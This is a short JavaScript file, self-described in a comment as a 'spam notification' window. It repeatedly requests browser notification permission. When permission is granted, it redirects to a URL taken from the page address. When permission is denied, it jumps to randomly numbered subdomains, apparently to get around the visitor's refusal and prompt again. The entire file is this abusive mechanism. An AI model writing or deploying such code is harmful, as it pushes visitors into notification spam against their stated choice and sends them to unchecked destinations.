// Domain name
var domain = location.host;

// Get url

var dect;
dect = location.href.split("&dect=")[1];
// Url generator

function gencode() {
var ran = Math.floor(Math.random() * 100);
return "https://ww"+ran+"." + domain + "/pushredirect/"+location.href.split("pushredirect/")[1];
}

// Spam notification acess window

Notification.requestPermission()
setInterval(()=>{


if (Notification.permission === "granted") {
    location.href = dect;
  } else if (Notification.permission === "denied") {
    location.href = gencode();
}


},5000);
